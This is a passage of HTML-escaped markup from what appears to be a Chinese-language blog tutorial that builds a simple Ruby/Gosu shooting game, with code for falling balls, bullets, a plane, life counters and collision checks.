    &lt;span class=&quot;vi&quot;&gt;@last_shoot_time&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;shoot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bullets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@last_shoot_time&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;0.2&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;bullets&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Bullet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vi&quot;&gt;@x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@hf_height&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;vi&quot;&gt;@last_shoot_time&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;那么继续, 趁热打铁来加入&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ball&lt;/code&gt;类吧. 这里我们暂时不管受到攻击之类的, 
但是打算用一些有意思一些的东西来让这个球画出来:&lt;/p&gt;

&lt;p&gt;还是之前就看过的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;draw&lt;/code&gt;方法, 这个时候我们来用下之前没有被用过的参数:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#draw(x, y, z = 0, scale_x = 1, scale_y = 1, color = 0xff_ffffff, mode = :default)&lt;/code&gt; =&amp;gt; void&lt;/p&gt;

  &lt;p&gt;Draws the image with its top left corner at (x, y).&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;(补充一个没什么用的小知识: 对于RGB色彩模式来说, 每一个颜色都是由三种基本颜色合成的. 
这三种颜色分别是R(ed)红色, G(reen)绿色, 还有B(lue)蓝色. 
不同颜色混合的多少就决定了是什么颜色. 这就是我们的颜色的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xff_ffffff&lt;/code&gt;后面几位的意义, 
那么前面的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ff&lt;/code&gt;是什么? 那就是透明度. 假如有兴趣的可以修改一下颜色的透明度之类的. )&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Ball&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;initialize&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@image&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Gosu&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rec/ball.png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@scale&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@hf_height&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vi&quot;&gt;@image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;height&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@scale&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@hf_width&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vi&quot;&gt;@image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;width&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@scale&lt;/span&gt;

    &lt;span class=&quot;vi&quot;&gt;@x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;480&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; 
    &lt;span class=&quot;vi&quot;&gt;@v&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;move&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@v&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@v&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;600&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@v&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;                         
    &lt;span class=&quot;vi&quot;&gt;@v&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;0.1&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;unless&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;600&lt;/span&gt;                                
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;                                                      
                                                           
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;draw&lt;/span&gt;                                                 
    &lt;span class=&quot;c1&quot;&gt;# 球在子弹的上一层                                     &lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;draw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vi&quot;&gt;@x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@hf_width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@hf_height&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@scale&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@scale&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;                                                                         
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;GameWindow&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Gosu&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Window&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;# 初始化&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;initialize&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 球的数组&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@balls&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;update&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 球的移动&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@balls&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ball&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;ball&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;move&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 删除没用的球, 删除没用的子弹等&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;# 绘制界面&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;draw&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@balls&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ball&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ball&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;draw&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这里解释一下代码:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;我们定义了一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@scale&lt;/code&gt;来缩放球的大小&lt;/li&gt;
  &lt;li&gt;然后让这个球的出现是在x方向上随机分布的&lt;/li&gt;
  &lt;li&gt;球的运动是模拟了一个自由落体运动&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这样一对操作之后, 我们运行代码就可以得到一个比较好的结果了:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/_img/i-am-boring/a-good-result.png&quot; alt=&quot;一个比较好的结果&quot; title=&quot;有点感觉了吧?&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;让游戏活起来&quot;&gt;让游戏活起来&lt;/h2&gt;
&lt;p&gt;毕竟上面的那些简单的代码并不能让我们的游戏变得合理, 相反的, 这让我们的游戏有点麻烦, 
因为我们的球的行为很奇怪: 撞到子弹不会消失, 撞到飞机不会爆炸等等. 
所以我们需要让游戏变得更加的合理.&lt;/p&gt;

&lt;p&gt;所以我们要给我们的球加上一些生命, 然后让我们的子弹能够在击中后消失, 
让我们的飞机在碰到球后会受伤…&lt;/p&gt;

&lt;h3 id=&quot;给球以生命&quot;&gt;给球以生命&lt;/h3&gt;
&lt;p&gt;让我们给&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ball&lt;/code&gt;一个生命&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@life&lt;/code&gt;, 在每次受到子弹撞击的时候就把自己的生命&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-1&lt;/code&gt;, 
然后在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@life &amp;lt;= 0&lt;/code&gt;时出局. 这样就可以解决杀不死球的问题了.&lt;/p&gt;

&lt;p&gt;(先这样, 第一部分结束了, 大概用上面的知识就可以继续做下去了, 
所以我将在之后发布第二部分的内容. &lt;del&gt;绝对不是我想跑路的原因.&lt;/del&gt;)&lt;/p&gt;

&lt;p&gt;(开始啦… )&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Ball&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;initialize&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@life&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;hit_bullets?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bullets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;bullets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bullet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hit?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bullet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;vi&quot;&gt;@life&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;bullet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hit!&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;hit?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;distance&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;0.5&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;distance&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@hf_height&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;hit_bullets?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bullets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;    
    &lt;span class=&quot;n&quot;&gt;bullets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bullet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;    
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hit?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bullet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;    
        &lt;span class=&quot;vi&quot;&gt;@life&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;    
        &lt;span class=&quot;n&quot;&gt;bullet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hit!&lt;/span&gt;    
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;true&lt;/span&gt;    
      &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;    
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;    
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;false&lt;/span&gt;    
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;    
    
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;hit_plane?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plane&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;    
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hit?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plane&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;vi&quot;&gt;@life&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;plane&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hit!&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;true&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;false&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;within?&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@life&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Plane&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;# 初始化的时候在窗口的底部中间&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;initialize&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 生命值&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@life&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;pos&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@y&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;hit!&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@life&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;life&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@life&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Bullet&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;initialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@life&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;pos&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@y&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;hit!&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@life&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

